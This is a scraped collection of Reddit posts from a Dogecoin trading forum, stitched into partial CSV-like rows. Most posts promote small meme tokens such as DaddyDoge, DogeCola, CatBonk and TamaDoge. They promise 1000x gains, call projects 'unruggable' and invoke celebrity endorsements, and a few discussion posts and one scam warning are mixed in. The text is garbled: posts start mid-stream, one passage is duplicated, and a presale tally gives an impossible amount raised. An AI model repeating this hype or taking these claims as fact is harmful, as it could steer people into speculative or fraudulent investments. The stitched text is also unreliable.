**The Entry Point. You are early.** PYE’s goal is to become a top 10 token. We have the community, the experience, and the tech to back that goal. We were consolidating for the past few weeks and I have been posting about how it may have been the last time we saw those prices. We all believe in the project being the future of crypto. When we achieve our goal of becoming a top 10 token, that is over a 1000x gain from here. The holders, the community, and the exposure are growing exponentially. We have had YouTube posts and mentions from some of the biggest names in the game, including Torin Hoffman, Conor Kenny, and Alexandrus 1337. Just last week PYE was mentioned on the Pardon My Take podcast, which pulls in 1.5 million daily listeners. The CEO is good friends with business mogul Gary Vee (video of them hanging out posted in telegram), and former Miami Heat player Damian Jones recently retweeted Creampye. These are many exciting developments in the early days of PYE.

**In conclusion** I have only given a brief overview here, but I invite you to do more research yourself. We are blazing our own trail in the world of crypto that will give investors access to an entirely new, user friendly ecosystem of programs. Many will try to replicate what we are creating for decades to come. Creampye is a results oriented, relentless, and highly experienced team. The last piece of the puzzle is more eyes on the project. You can see that we are listed on CoinMarketCap, CoinGecko, ProBit, and WhiteBit. Soft dates have been given for more exchange listings, and big news is happening every single day. Do your own research and if you decide to join the Pye fam, buckle up, its going to be a crazy ride!

DOGE,CryptoCurrencyTrading,DaddyDoge | BigONE exchange listing tomorrow | BitMart listing very soon | Launch page BTOK ads ongoing | Video shoutouts by Elon | Times Square takeover and global billboards incoming | Unannounced project that will eclipse everything we have done before coming very soon | DaddyDoge to Mars 🚀,"**What is it?**

Daddy Doge is the head of the Doge family, already with 33000 holders and a $10,000,000 market cap in just over 2 weeks. BigONE exchange listing 23/7. You might have seen the viral video of Elon claiming DaddyDoge is going to Mars ([https://twitter.com/DaddyDOGEtoken/status/1415713506976993283](https://twitter.com/DaddyDOGEtoken/status/1415713506976993283)), if not, maybe you’ll be one of the 5 million daily active users that will see the launch screenDaddyDoge advert on BTOK running right now which has already increased our Chinese TG numbers to over 10000. Either way, the audience is huge and ever growing. We are also classed as unruggable and have a rug screen nft certificate you can see here - (https://www.rugscreen.com/scan/certificate?tokenid=97dd949f5c) Don’t miss out!

“Some people don't believe in heroes but they haven't met my dad.” DOGE 2019.

**How to find us**

* [Buy on Pancake](https://exchange.pancakeswap.finance/#/swap?outputCurrency=0x7cce94c0b2c8ae7661f02544e62178377fe8cf92) 
* [Twitter](https://twitter.com/DaddyDogeToken)
* [Website](https://daddydoge.finance/)
* [Reddit](https://www.reddit.com/r/DaddyDOGEtoken/)

**What are the tokenomics?**

Simple as you like, there is a **9%** total transaction fee compromising of:

💰 **3% distributed to all holders**

The Daddy looks after his pups and rewards them by just holding. Every buy and sell gets paid amongst Daddy Doge holders in reflections. In short, the longer you hold the more tokens you earn.

💰 **3% added to the liquidity pool**

The contract accumulates tokens on buy/sells and then adds them to the liquidity pool to create a solid price floor and increases the stability of the token for everyone's benefit!

💰 **3% sent to a house wallet**

A token is nothing without longevity and marketing. A substantial marketing budget is in place to push this token higher than any other token. Over $150,000 has already been spent with vastly more lined up to be spent in the coming days and weeks. Exchanges, influencers as well as global billboard takeovers in time square, London, Dubai and Tokyo are just a few things lined up.

**What else?**

Daddy Doge is fed up of seeing rug pulls and honey pots, so he’s decided to give the community as much confidence as possible by:

* Locking liquidity for 5 years
* Renounced ownership
* Community driven
* Devs hold no separate big token wallets

DOGE,CryptoCurrencyTrading,$DCH: DogeCoinCash 🐕 JUST LAUNCHED. Ownership renounced and Liquidity locked 🔐,"DogeCoin Cash is, a rug-proof, ownership renounced, community-driven project on the Binance Smart Chain.

Bitcoin Cash reached an ATH of 0.25 Bitcoin. Our first goal is for DogeCoin Cash to reach 25% of Doge Coin’s peak market capitalization. We are fully committed and determined to make this happen, but our ambitions go much further. We believe we can – in time – be a household name and a long-standing top 25 crypto project.

DogeCoin Cash was stealth-launched by members of the BSC community after DogeCoin reached a market cap of over 30 Billion Dollars. DogeCoin Cash gives holders passive rewards through static reflections. By staking DogeCoin Cash in a pool, it raises its own capital, ensuring liquidity.

DOGE,CryptoCurrencyTrading,🐶 ShibaDoge |More then 1k entries in sweepwidget 💰Join Community 🔥 Shill to Your Friends to get Qualified for Whitelist Join Community ✅ 100x based Dev Team 🚀,"What is ShibaDoge?? 🐳

The newest and most exciting crypto currencies to date is SHIBA DOGE. The SHIBA DOGE token is a hyper-deflationary token that focuses on rewarding holders automatically with Shiba or Doge. This revolutionary concept is based on the stability of Shiba /Doge and instilling holders with the confidence that they will be holding it as a stable reflection. What sets SHIBA DOGE aside from the rest of the pack are the Shiba or Doge reflections that each holder will receive..

The SHIBA DOGE token project team is led by a team of successful developers and experienced marketing professionals in the BSC space. The team aims to encourage investors to hold their tokens by rewarding investors automatically with Shiba or Doge.

DYOR 🎯 !!

There’s no hiding anything on the blockchain. You are more than welcome to assess for yourself the legitimacy of this project based on the transaction on the public ledger. Check out this webpage for a crash-course on how to spot and avoid rug pulls. The SHIBA DOGE team encourages knowledgeable buyers who understand the risks and intricacies of trading cryptographic tokens, including how to safely transact and store tokens. As with most cryptographic tokens, SHIBA DOGE is liable to experience extreme fluctuations in price over a short period of time. By purchasing SHIBA DOGE tokens, users expressly acknowledge and represent that they fully understand that the token may experience volatility in pricing and will not seek to hold the issuer liable for any losses or any special, incidental, or consequential damages arising from, or in any way connected to, the purchase of SHIBA DOGE token....

DOGE,CryptoCurrencyTrading,DogeHouse Capital 🐕 | Official Website & Staking dApp Launch 🥩 | Functional Utility w/$ADA Dividends 💰 | Swap/DTF Coming Soon! 🤝,"**Invest Confidently on the Binance Smart Chain, Cardano Blockchain, and Beyond!**

DogeHouse  Capital is the only cryptocurrency project bringing professional  digital asset management to meme-based digital currencies on the Binance  Smart Chain, Cardano Blockchain, and beyond. At DogeHouse, we believe  in investing in puppies with a purpose - not pump and dump ""shitcoins"".

DogeHouse  Capital is not dependent on our BSC-based native token ($ DOGEX) to  succeed. We will launch our native token on PancakeSwap (PCS) in/around  mid September, but our project is much more than a typical BSC token.

DogeHouse  Capital will also provide our members with an opportunity to purchase  wrapped tokens modeled after Exchange Traded Funds (ETF) containing the  world's top cryptocurrencies in a single token! That's a first in DeFi!  More on this below...

\- [https://t.me/DogeHouseCapital](https://t.me/DogeHouseCapital)

\- Homepage: [https://www.dogehousecapital.com/home](https://www.dogehousecapital.com/home) 🏠

\- Staking Platform (dApp): [https://www.dogehousecapital.com/staking](https://www.dogehousecapital.com/staking) 🥩

\- Swap/DTF: Coming Soon! 📈

\- Cardano Bridge: Coming Soon! 🌉

Practical Utility at Launch

At  launch, DogeHouse Capital will offer our investors a full suite of  dApps including a staking platform and proprietary swap. Check out our  thoughts on staking on Medium!

Furthermore,  as mentioned above, we will also provide our users with an opportunity  to trade the only professionally managed Exchange Traded Fund (ETF) in  DeFi called the Doge Traded Fund (DTF).

For  years, Wall Street has tried to set-up an ETF for cryptocurrency, but  the rigid regulatory nature governing our traditional financial markets  has not allowed it to happen. In DeFi, no such regulations exist and  tokenized versions that mirror traditional ETFs on Wall Street can be  wrapped and traded via our one and only proprietary dApp!

For  a limited number of investors, DogeHouse Capital will also offer an  exclusive fund managed by us with a focus on the Cardano, Polkadot, and  Kusama blockchain(s) and their associated infrastructure for steady  annualized returns. Check out our philosophy on digital asset management  on Medium!

\- Medium: [https://medium.com/@dogehousecapital](https://medium.com/@dogehousecapital)

Looking Ahead

There  are a lot of ""Cardano Rewards"" projects hitting the ""shitcoin"" market  these days, but few of them have any appreciation and/or conceptional  understanding of why Cardano will revolutionize the industry.

At  DogeHouse Capital, we are focused on investing in the future of DeFi -  not the past. For this reason, we will focus on the development of our  bridge to the Cardano Blockchain following our successful launch on PCS  in/around mid-September 2021.

This  course of action will provide our members with a practical utility that  will enable them to transfer their $ADA pegged to $BNB rewards into the  Cardano Native Token (CNT) in anticipation of the coming shift to the  Cardano Blockchain.

We have big plans for the future and we want you to be a part of them. Consider investing with us today and pay us a visit!",94,2021-08-30 21:04:23,14

\- Swap/DTF: Coming Soon! 📈

\- Cardano Bridge: Coming Soon! 🌉

Practical Utility at Launch

At launch, DogeHouse Capital will offer our investors a full suite of dApps including a staking platform and proprietary swap. Check out our thoughts on staking on Medium!

Furthermore, as mentioned above, we will also provide our users with an opportunity to trade the only professionally managed Exchange Traded Fund (ETF) in DeFi called the Doge Traded Fund (DTF).

For years, Wall Street has tried to set-up an ETF for cryptocurrency, but the rigid regulatory nature governing our traditional financial markets has not allowed it to happen. In DeFi, no such regulations exist and tokenized versions that mirror traditional ETFs on Wall Street can be wrapped and traded via our one and only proprietary dApp!

For a limited number of investors, DogeHouse Capital will also offer an exclusive fund managed by us with a focus on the Cardano, Polkadot, and Kusama blockchain(s) and their associated infrastructure for steady annualized returns. Check out our philosophy on digital asset management on Medium!

Looking Ahead

There are a lot of ""Cardano Rewards"" projects hitting the ""shitcoin"" market these days, but few of them have any appreciation and/or conceptional understanding of why Cardano will revolutionize the industry.

At DogeHouse Capital, we are focused on investing in the future of DeFi - not the past. For this reason, we will focus on the development of our bridge to the Cardano Blockchain following our successful launch on PCS in/around mid-September 2021.

This course of action will provide our members with a practical utility that will enable them to transfer their $ADA pegged to $BNB rewards into the Cardano Native Token (CNT) in anticipation of the coming shift to the Cardano Blockchain.

We have big plans for the future and we want you to be a part of them. Consider investing with us today and pay us a visit!",120,2021-09-05 22:12:32,9

DOGE,CryptoCurrencyTrading,🐶 ShibaDoge | Whitelist Competition - 🚀 Get in Early 💸 Shill to Your Friends to get Qualified for Whitelist 💰 Join Community ✅ Don't Miss Out !!!," The Story of Shiba Doge

Shiba  Inu and Doge met at a coffee shop for their first date. They always had  high aspirations to build something big together. But, it wasn’t until  that fateful day at the coffee shop that they decided to do something so  big, right there on the coffee table napkin. They pulled their chairs  closer together and drew a road map to moon- The Shiba Inu Doge Moonmap.  After planning out their next few weeks together they decided to start  building a rocket and plan their first trip to space together. Join  Shiba Doge and become a part of the community as we build our rocket to  space 🚀

What is ShibaDoge?

The  newest and most exciting crypto currencies to date is SHIBA DOGE. The  SHIBA DOGE token is a hyper-deflationary token that focuses on rewarding  holders automatically with Shiba or Doge. This revolutionary concept is  based on the stability of Shiba /Doge and instilling holders with the  confidence that they will be holding it as a stable reflection. What  sets SHIBA DOGE aside from the rest of the pack are the Shiba or Doge  reflections that each holder will receive.

The  SHIBA DOGE token project team is led by a team of successful developers  and experienced marketing professionals in the BSC space. The team aims  to encourage investors to hold their tokens by rewarding investors  automatically with Shiba or Doge.

DOGE,CryptoCurrencyTrading,Memecoins like DOGE and SHIBA are fun and all but there are actual undervalued good projects people can still invest in,"I get the meme appeal of people buying DOGE and SHIBA because Elon shills them but there are now a ton of animal clone coins people are pump and dumping while some good defi projects get ignored. I'm not trying to hate on Doge SHIBA or other joke coins, if you make profit on them good for you. I’m just trying to say we can support strong projects which are trying to build a system which can replace apps like robinhood and help crypto grow and gain adoption.
This article mentions several good defi projects which are actively building useful things for the future. It's worth checking out some of the stuff people are building as well as meme coins.

DOGE,CryptoCurrencyTrading,🥤 $DogeCola | First Soft Drink and Reflection token ever | Unique Autoboost function which prevents dumps | Best Tokenomics | CG in 12 hours | Large marketing funds | Team KYC’d | BTOK campaign starting tomorrow | Huge Potential | Next Shiba Inu 🚀," 

DogeCola has every intent to be the next big thing out there in the crypto world. There are a lot of things that set DogeCola apart, but two main items deserve to be mentioned first, which are 1) the very unique Autoboost function which already has proven to be extremely powerful and 2) DogeCola being the first reflection token and soft drink at the same time!

Firstly, let’s go into the Autoboost function:

• The Autoboost function is built mathematically to do variable buybacks based on volume and transactions in the last 24 hours in order to maintain stability. It will buy back variable amounts every time a sale occurs. Bought tokens will be burnt instantly! 🔥 7% has been burnt in only three weeks via this function.

• The Autoboost sells a fixed amount of tokens every few hours, mainly when there are green candles. With this, BNB is being gathered to perform manual buybacks in times of need! This has been proven multiple times to be extremely effective and to prevent a downwards trend! For example, at this current moment, 400BNB is saved up to buy back tokens if needed. 🚀

Secondly, DogeCola will be available as a soft drink before you know it!

• Samples are already ordered from different companies and they will be distributed as soon as the cans are received! This is expected to be in the market within 3 months! 🥤🐕

• Usually, many tokens or Doge family tokens do not have a real-world purpose or use case. This is what distinguishes DogeCola. They are connecting the crypto world and communities to reality with a fancy soft drink.

But, there are so many other amazing things to mention about DogeCola. They have an extraordinary and transparent team, who put literally all their time into making DogeCola the next Shiba Inu and this really has been paying off:

🦎 Listed on CoinGecko within 12 hours after launch!

⚡️ Amazing marketing: multiple YouTube video’s about DogeCola per day, Times Square Billboard, Poocoin adds, Articles in different journals, connections to some important influencers already, and many more things. BTOK ads start from tomorrow 20th of August until 27th of August!

📈 Listed in record time after 1 day from the launch on ZT exchange. After three weeks got listed on BigOne exchange.

🔒 Audit and KYC done via Solidproof

🔥 16% burnt, continuous burning ongoing!

DOGE,CryptoCurrencyTrading,BONE surpass DOGE,"It seems like DOGE is having trouble. Kraken's price has decreased along with the value of other key digital assets since it made the decision to cease operating its bitcoin staking operations.  


Yet, SHIB and BONE ShibaSwap have outscored DOGE over the past 90 days. SHIB prices only managed to rise by 30% at the same time period, compared to a 121% increase in BONE costs.  


The recent adverse trend in the cryptocurrency market and the decrease of Dogecoin have several explanations, including high inflation, challenging market conditions, and many more.  


Shiba metaverse tokens along with Windfall tokens are what I'm sticking with this year because I've heard that it's the year of the metaverse tokens. Its low cost really surprises me.  


Don't you find it surprising that other meme coins like Shiba Inu and BONE overcame all of this to surpass DOGE and become significant cryptocurrencies in the unstable cryptocurrency market? Do you believe that this trend will continue?  


I think the upcoming release of the Layer 2 Shibarium beta is what's causing this increase. As you are aware, the native token chosen for the Shibarium protocol to pay for gas transactions and award validators will be BONE.",5,2023-02-16 20:27:44,0

DOGE,CryptoCurrencyTrading,DOGE-1 SpaceX mission next year,"Musk said on Twitter in April that SpaceX was going to put a ""literal Dogecoin on the literal moon"".

DOGE-1 SpaceX mission next year, receives payment in Dogecoin to fund the mission.

This speaks volumes on the correlation going forward between Dogecoin and the world's leading space exploration company.

ElonMusk’s SpaceX is launching a Dogecoin funded satellite to the Moon. DOGE-1 is a Cube Sat to acquire lunar-spatial intelligence using cameras & sensors, being sent/paid for by Geometric Energy Corporation, it’ll be flown up on a Falcon9 rocket in 2022.

SpaceX is launching a space mission to the moon in 2022, and has accepted meme cryptocurrency Dogecoin as payment to take a payload on the journey.

Geometric Energy Corp, a manufacturing and logistics firm, said on Sunday it had paid Elon Musk's SpaceX in Dogecoin to take a space-exploration satellite on the mission.

SpaceX is helmed by billionaire Elon Musk, the foremost advocate for dogecoin, meme cryptocurrency Dogecoin has risen more than 11,000% year to date. As a result, Dogecoin has seen increased adoption and use cases, including now payment for a trip to the moon.

The DOGE-1 payload will obtain lunar-spatial intelligence from sensors and cameras on-board using communications and computational systems, GSC said in the statement yesterday.

""This mission will demonstrate the application of cryptocurrency beyond Earth orbit and set the foundation for interplanetary commerce,"" SpaceX Tom Ochinero said in the release. ""We're excited to launch DOGE-1 to the Moon!"" - Elon Musk

Musk’s SpaceX Accepts Dogecoin as Payment for Sending a Satellite to the Moon The #DOGE-1 Mission to the Moon will launch aboard a SpaceX Falcon 9 rocket in Q1 2022.",96,2021-05-12 22:54:49,9
DOGE,CryptoCurrencyTrading,Missed 100x on DogeBonk? Get CatBonk NOW,"Alright, enough with the standard shilling template. Let's be honest why $CatBonk is a good bet.

1. No whale wallet, biggest holder being at 2%
2. LP is FULLY burnt, 85% rating from Tokensniffer. Project is literally UNRUGGABLE.
3. Backed by a team of 20 hardworking peeps
4. Meme Coins moon for no reason (doge, shiba, floki, catgirl, dogebonk, etc)
5. Steady and organic growth for past week. Support holding very well.
6. CG and CMC applied for and incoming
7. HUGE bomb dropping soon...

With DogeBonk exploding in popularity, it doesn't hurt to hedge against the doge derivatives with the FIRST, ORIGINAL CatBonk (CABO).

FYI, DogeBonk sits at 150m MCAP while CatBonk is currently at 6m MCAP. Massive potential for upside. If you regretted not getting in early on DOBO, this is your chance.

After a week of consolidation and holding support at a respectable price, the CatBonk Rocket is primed for takeoff.

Is CatBonk safe?

99.22% of supply burnt into LP on Pancakeswap. (Dev further burnt 24% of remaining LP an hour ago to show his dedicated to the project)

Doge Back is aptly named ! It's a simple concept - it combines the two trending mechanisms : buy back and dividend.

By simply holding, you will earn Elon’s favourite crap coin - DOGE. The longer you hold, the more you earn - it really is that simple.

You may wonder how you get DOGE without doing anything but hold ? You may thank the smart contract that use a new trending feature that will buy Binance-Peg DOGECOIN and distributes it every 30 minutes to all holders.

***Presale is scheduled on Sunday at 8pm UTC***.

This means that there is a good amount of time to both pay for marketing to build up the telegram and investors, but also agree to the marketing roadmap for post launch.

Team will be working with instagrammers, proffessional shillers, tik tokers - they won’t just be relying on the usual CMS post which is lost in 10 seconds.

Listing on all the platformes (Coinsniper, Coinhunt...) is also under way with massive votes to come.

With the continual development of our project, alongside the impending mass adoption of cryptocurrency and Dogecoin, Dogecoin cash has the potential to sit alongside Dogecoin as the alternative store of value. The silver to dogecoin’s gold.

💬 Telegram : [https://t.me/DogeLightningBSC](https://t.me/DogeLightningBSC)

DogeLightning is a sidechain solution for DogeCoin that serves two critical purposes. The first is aggregating DOGE to allow for less volatility and a more stable price point. The DogeLightning platform automatically converts DOGE to DOGGLE at the point of transaction, leveraging a user provided DOGE/DOGGLE liquidity pool to ensure fair rates. While Dogecoin is inherently and explosively inflationary over time, DogeLightning is deflationary through an associated transaction fee. 5% of each transaction is burned, reducing the supply over time.

DOGE,CryptoCurrencyTrading,Do you believe Dogecoin's future growth will be impacted by the fact that WordPress websites may now take DOGE payments?,"As time passes by there are more and more businesses, industries, and websites that are accepting crypto payments, and I truly believe that we will start very soon using these types of payments. The latest news when it comes to crypto payments that I heard was about Dogecoin and its possibilities to be used for payment on WordPress websites.   
 

Crypto certainly is becoming a very important thing in our lives, I hear that we can even invest in Unicorn companies with crypto (with Unicoins), and we may purchase food and other products we use on a daily basis, so I expect that we would have more often these type of news.   
 

Do you use crypto to invest in something or to purchase something with it?    
 

Do you think that this news about WordPress websites and Dogecoin payments will bring more popularity and price increase to Doge these days?    
 

Even if the meme coin's price hasn't been great, big advancements have helped sustain community morale, and perhaps this announcement will do the same.",3,2022-05-10 14:15:34,5

Hi guys,

I look for tokens that are 100% safe based on LP burn, contraction verification through [rugscreen.com](https://rugscreen.com/) and ownership renounced. I have possibly found a gem named **LottoDogeX.** It was fair launched yesterday, and the website is already live ([https://lottodoge.net](https://lottodoge.net/)). This token fits the exact criteria I look for when I invest in gems.

**I would advise you to invest at your own risk and remember to take small profits along the way (don´t dump large amounts). The aim is for everyone to make some gains.**

Here is some useful information about **LottoDogeX:**

Doge Eat Doge (OMNOM) is a community-owned memecoin on DogeChain.

This token is also referred as the ‘Shiba killer’. Shiba Inu (SHIB) is an ERC20 meme token that was created to kill Dogecoin. Doge Eat Doge (OMNOM) is fighting back - get the first meme token on Dogechain to eat SHIB.

>Let’s eat SHIB for breakfast

$OMNOM Contract Address: 0xe3fcA919883950c5cD468156392a6477Ff5d18de

OMNOM was launched on August 10,2022. During the initial launch, 69% of the supply was burned to Vitalik Buterin's wallet, and the remaining 31% of the supply has been added to a pool on Dogeswap.

**How To Buy Doge Eat Doge ($OMNOM)?**

Follow the tutorial bellow:

[**https://web3walrus.com/how-to-set-up-dogechain/**](https://web3walrus.com/how-to-set-up-dogechain/)

**What is Dogechain?**

Dogechain is an EVM-compatible blockchain built using [Polygon SDK](https://polygon.technology/) to create an efficient connection between Dogecoin (DOGE) and Web3. Dogechain’s infrastructure allows DOGE holders to port their DOGE into a blockchain with more possibilities and embrace more opportunities using their DOGE.

Dogechain presents to developers a platform to build DeFi, GameFi, NFTplatforms, and other decentralized applications with DOGE as part of its core economic system. Being [EVM](https://www.coingecko.com/en/glossary/ethereum-virtual-machine-evm)(Ethereum Virtual Machine) compatible, developers on Ethereum and other EVM blockchains can easily build new applications or bridge their existing applications to Dogechain without changing their original code or learning new programming languages

Dogechain runs the Proof of Stake (PoS)algorithm and offers a scalable, fast, and cheap blockchain to DOGE holders who wish to explore more use cases for their DOGE and the rest of the cryptocurrency community as well. The Dogechain community hopes to build gilt-edge NFT, DeFi, and Web3 platforms and also maintain the core characteristics of the original DOGE community.

**How Does Dogechain Work?**

The only peculiar feature of the Dogechain is interactivity features that enable a connection with the DOGE blockchain. Apart from this, Dogechain is similar to Polygon chain and other EVM-compatible PoS chains.

Moving your DOGE to Dogechain involves a special bridging process that allows you to wrap your DOGEs. The wrapping process enables you to create a new token pegged to the value of DOGE on Dogechain. For instance, when you wrap 100 DOGE using Dogechain’s bridging facility, you will receive 100 wrapped doge (wDOGE) on your Dogechain wallet. The wrapped DOGE is pegged to the value of DOGE and can be easily inter-bridged across both platforms.

DOGE,CryptoCurrencyTrading,"🚀 Moonradar Finance ( $MRF ) 🚀 Presale in 6 hours. A utility token with solid roadmap. Helping teams like BabyDoge, Tiki token. Listed on Coinmarketcap","**About Moonradar**  


MoonRadar is a Boosterpad for projects built on the Binance smart chain and provides a layer of security for investors by whitelisting safely traded projects. Our aim is to increase the quality of Blockchain projects by building a set of tools that can be leveraged by Project creators to boost their value and by investors to analyse and invest in projects at an early stage. At MoonRadar, we are building a suite of tools both for project creators and investors in the BSC ecosystem. For Project creators, we bring value by adding key functionality to their token. For investors, we provide key metrics and early calls to Gems to jump on quite early and ride the wave while keeping their investments safe.  


**FEATURES**  


**Token Whitelisting** \- Our custom swap built on Pancakeswap to trade whitelisted tokens. We whitelist tokens based on a number of key metrics that we anayse. Here is an article highlighting the benefits of trading with our swap engine - [**https://blog.moonradar.finance/advantages-of-trading-with-moonradar-3e42a24e431b**](https://blog.moonradar.finance/advantages-of-trading-with-moonradar-3e42a24e431b)  


**MoonDex** \- We are building custom DeX interfaces for project creators to add value to their projects. We've recently onboarded **BabyDogeCoin**, **Tiki token**, **BabyShibaInu**, **Moonrise**. Check out what BabyDoge have to say about us - [**https://twitter.com/BabyDogeCoin/status/1400102248282214401**](https://twitter.com/BabyDogeCoin/status/1400102248282214401)  


**MoonBrowse** \- Users of Moonradar benefit from the early calls that we give to BSC Gems. We've given early calls for tokens like $MIL, $HUNNY, $BabyDogeCoin and all of them did very well.  


**MoonBoard** \- We're building an analytics dashboard around whitelisted projects where users can track their portfolio, earnings from Reflection and analyse token metrics including price dump alerts.  


**MoonBuy** \- Users are able to buy crypto with Visa card on Moonradar. Project creators can use this feature to increase token adoption on their websites.  


**Casino & Games** \- Project creators can add casino & gaming functionality to their tokens and burn the revenue generated from it to make the token hyper deflationary with a utility.  


**Stakingpad** \- Project creators can encourage users to add liquidity for their token by providing token rewards.  


**Launchpad** \- Soon, project creators will be able to launch their tokens on our launchpad.  


Some more interesting features that we are launching can be found on our Roadmap - [**https://moonradar.finance/wp-content/uploads/2021/07/cfa6032b-7bd3-4990-b1f2-fb440e080847.pdf**](https://moonradar.finance/wp-content/uploads/2021/07/cfa6032b-7bd3-4990-b1f2-fb440e080847.pdf)  


**The project is already listed on Coinmarketcap & Dapp Radar.**  


**$MRF TOKEN**  


$MRF is a utility token that will be at the core of our ecosystem. The features that we are currently offering(DeX, Buy Crypto, Dashboard, Donate, Casino, Staking pad, Launchpad) will have to be bought by staking $MRF tokens. We plan to extend these features further to become a one stop boosterpad solution for all BSC projects. On the other hand, holders of $MRF tokens will get early calls from us to help them hunt Gems and get into the game before anyone else does! We essentially want to help people build safe & quality projects and connect investors to those projects! MRF lie at the center of this ecosystem!

The goal of Ultimate Doge is to focus on making a positive contribution to Humanity. This will be possible through donations to special charities who aim at teaching and improving self sustainability, and general education towards climate change. These charities are all about our long term existence as Humans.

Workshops will be held in order to educate the population about self- sustainability. This will include teaching how to grow their own fruits and vegetables, in a sustainable and healthy fashion. Education is at the core of all our progress as a specie, and we believe that it is the same case for developing a greener more sustainable future.

Ultimate Doge’s tokenomics will be as follows; a 10% tax on every transaction of which 5% will be distributed as reflections to all holders and the other 5% will go to liquidity in to make the project stronger and to power new initiatives.

Ultimate Doge uniqueness comes from its mixture of a good will and intention for the world, alonside portraying a fun, vibrant image to investors. The community strong token, will make it profitable and fun for longterm investors, as we do need to feel like we are doing good in the world, and what better way by donating to charity while at the same time have the opportunity to make money as a holder. 

A collection of 10,000 nft’s have been created on the Ethereum Network, once this collection has sold out, ultimate Doge will then become a multi chain crypto coin and will move to the Ethereum Smartchain.
Some of the Proceeds from the sale of the nft’s will be used to create liquidity on the ethereum smart contract, there will be a 50,000$ usd giveaway which will be shared between 20 lucky nft holders with another 50,000 usd been donated to good causes.

Ultimate doge doesn’t want to solely rely on transactions of the coins to be able to sustain itself while making regular donations. To combat this issue a staking option will be applied in order to reward the investor as well.

To keep Ultimate doge relevant it will offer nft staking and develop a play to earn game to make interacting with the project fun and exciting for investors.

As ultimate Doge grows it will continue to develop new utilities that will financially benefit holders and charities, while increasing incentive to join the project.

DOGE,CryptoCurrencyTrading,TamaDoge is the ultimate memecoin Play-to-Earn platform. (Presale Stage 4),"TamaDoge is the ultimate memecoin Play-to-Earn platform, and it couldn't be easier to get your hands on the token in our pre-sale. You can buy directly using your card, or can use USDT or Eth already in your wallet. After the public presale ends, you'll be able to claim your purchased TamaDoge using the claim page.

1 USDT = 57.14 TAMA

USDT Raised : $5,377,781,528/$6,500,000

HOW TO BUY TAMADOGE

STEP 1

To begin, make sure you have a MetaMask wallet installed on your browser, or use one of the wallets supported by Wallet Connect (we recommend Trust Wallet).

Purchasing on a desktop browser will give you a smoother purchasing experience. For this we recommend Metamask.

If you are purchasing on mobile, we recommend using Trust Wallet and connecting through the in built browser (just copy [https://buy.tamadoge.io](https://buy.tamadoge.io/) into the Trust Wallet Browser).

STEP 2

Once you have your preferred wallet provider ready, click “Connect Wallet” and select the appropriate option. For mobile wallet apps you will need to select “Wallet Connect”.

You will then have 3 options

Buy ETH With Card. This option will allow you to purchase ETH that will be sent to your wallet by our partner, Transak. You will then be able to use this ETH to purchase TAMA. Click “Buy Eth With Card” to begin and follow the on screen steps. We recommend purchasing a minimum of $15 worth of ETH to cover the minimum TAMA purchase.

Buy TAMA With ETH. Once you have sufficient ETH in your wallet (if you do not have ETH or USDT, please select option 1 to purchase ETH first), you can now swap your ETH for TAMA. Type in the amount of TAMA you wish to purchase (1,000 minimum) and then click “Convert Eth”. Your wallet provider will ask you to confirm the transaction and will also show you the cost of gas.

Buy TAMA with USDT. Please ensure you have at least $15 of USDT in your wallet before commencing the transaction. Type in the amount of TAMA you wish to purchase (1,000 minimum). Click “Convert USDT”. You will then be asked to approve the purchase TWICE. The first approval is for the USDT contract and the second is for the transaction amount. Please ensure you go through both approval steps in order to complete the transaction.

STEP 3

Once the presale has concluded, you will be able to claim your TAMA tokens. We will release details closer to the time, however you will need to visit the main site [https://tamadoge.io](https://tamadoge.io/) and click on the gold “Claim” button.

&#x200B;

The MATIC network has been exploded, apart from a few 'not so minor' hiccups in the market recently, the growth has been strong and we have seen an influx of people into the Polygon mainnet.

&#x200B;

One of the first memecoins (bare with me here) to launch on the network was PolyDoge, but it is already setting itself up as much more than a memecoin. With staking, liquidity pools and brand new NFT's released yesterday for people who were holding the coin a few days ago, PolyDoge is setting the gold standard on this young and upcoming network. 

&#x200B;

There is a great community on telegram, who stayed positive throughout the dip, with amazing fan art and even a song on spotify! (released today). Pop in for a look and join the 4150 and growing strong community who genuinely believe that this (still small market cap) coin is destined for great things.

DOGE,CryptoCurrencyTrading,Warning ⚠️ Safemoon2 ⚠️ Scam project team alert! ⚠️Safemoon2 is a Doge Crown! Beware,"**YOUR ONE UPVOTE CAN SAVE SOMEONE MONEY FROM GETTING SCAMMED.**

Hi guys,

I am not sure if I can post this here. Let me know and remove this post if required.

⚠️I just want to let you know that Safemoon2 is made by the same people who created DOGE CROWN. They are low profile scammers who link their private wallet for presale. Once you transfer funds they are banning you instantly and there is no way to get your money back.

**Additional Support**

I made a Telegram for anyone who have been scammed in the past or want to tell others that a presale or a project is a bit sus.

We can all support each other. I am not selling you any coin. But I am in tg if you need me!

[https://t.me/safemoon2\_officialscam](https://t.me/safemoon2_officialscam)

|Their tg group⚠️ BEWARE SCAMERS are HERE >>> [https://t.me/safemoon2\_official](https://t.me/safemoon2_official) ⚠️⚠️⚠️|

&#x200B;

I have got burnt by few scams myself, however, overall I made some what decent profit.

I guess the issue is that now it's getting sort of out of control.

It is getting to a point where it is dangerous: In more recent times, scammers are

A) creative with their schemes (see ICE and time lock mechanics)

B) are sneaky with their codes in their contract (see the quick animal or safe coins)

C) putting in effort into create websites and twitter

&#x200B;

**What to look out for:**

* no website
* the contract is identical or similar to previous scams (**please** **use an online diff checker**)
* No real answer where the project is heading in the future (not just a road map, ask them directly)
* Quick presale
* Presale with high BNB amount (like 500+) - they may delay the launch and never actually launch it
* The admin is weird and/or uses weird catch phrases

DOGE,CryptoCurrencyTrading,Small and strong. Big potential. Meet Fetus Doge 🐶 Launching soon 🚀,"There was DOGE, followed by Shiba Inu, then BabyDoge. Yeah, they're all dogs. But they all had something in common; they all started somewhere.

They were all Fetuses at one point.

Fetus Doge unites all dogs and has the genes to succeed and prosper.

Formed by seven community members tired of being left behind and rugged left and right, Fetus Doge is here to make some noise. This no-nonsense team is dedicated to grow FDOGE into the Greatest Doge of All Time (GDAT).

No fancy buybacks that actually sells more than buys, no promises of rewards, but rather just plain hard work and proven tokenomics that will evolve over time:

🐶 **Tokenomics:**

✋ 4% for redistribution

💦 4% for liquidity

👛 4% for marketing/charity

The team has been consistently transparent, and promises to continue to do so over time.

An initial 10% of the total supply has been burnt, and 20% more tokens will be burnt after launch, and 1-5% will be burnt **DAILY**!

The team is composed of 7 members and no wallet has more than 2%.

The marketing wallet is also out in the open, and they will be selling low amounts, only going with the flow with the chart and spending the marketing budget as needed for the growth of FDOGE.

Come and join the community while it's young!

We want to restore the faith🙏 that’s been lost by all these BSC tokens that fail or are quick pumps and dumps.

